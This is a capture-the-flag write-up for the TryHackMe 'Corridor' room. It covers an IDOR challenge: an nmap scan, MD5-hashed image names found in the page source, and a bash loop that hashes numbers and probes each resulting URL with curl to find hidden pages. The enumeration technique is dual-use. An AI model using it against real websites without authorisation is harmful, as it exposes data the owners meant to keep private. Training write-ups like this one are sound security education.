# Corridor

<img align="right" src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/corridor/Corridor1.png" width="150" height="150">

Can you escape the Corridor?

LINK = [https://tryhackme.com/room/corridor](https://tryhackme.com/room/corridor)

### FYI
This writeup don't include any passwords/cracked hashes/flags

# Description

You have found yourself in a strange corridor. Can you find your way back to where you came?

In this challenge, you will explore potential IDOR vulnerabilities. Examine the URL endpoints you access as you navigate the website and note the hexadecimal values you find (they look an awful lot like a hash, don't they?). This could help you uncover website locations you were not expected to access.

# Steps

1: Join the room, start the virtual machine and the AttackBox (or connect via VPN)

2: Find open ports and versions on the machine, the nmap output will show one open port:
* ```# nmap -sV <ip-virtual-machine>```
<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/corridor/Corridor2.png" width="40%">

3: Access the source code of the web server and notice that several images references appear with strage names

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/corridor/Corridor3.png" width="40%">

4: Using [CrackStation](https://crackstation.net/) you can see that those are MD5 hashes of the numbers 1 to 13

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/corridor/Corridor4.png" width="40%">

5: Using this script that brute force the MD5 hashes numbers in to the URL of the web server you can discover all the valid responses

```
#!/bin/bash
for i in {0..100}; do
        hash=$(echo -n $i | md5sum | cut -d " " -f 1)
        curl -sI "http://ip-virtual-machine/$hash" | grep -i "200 OK" > /dev/null
        if [ $? == 0 ]; then
                echo "With $i valid response in http://ip-virtual-machine/$hash"
        fi
done
```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/corridor/Corridor5.png" width="60%">

6: Access the valid hashes in the webserver

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/corridor/Corridor6.png" width="50%">

7: Get the flag!! 😎
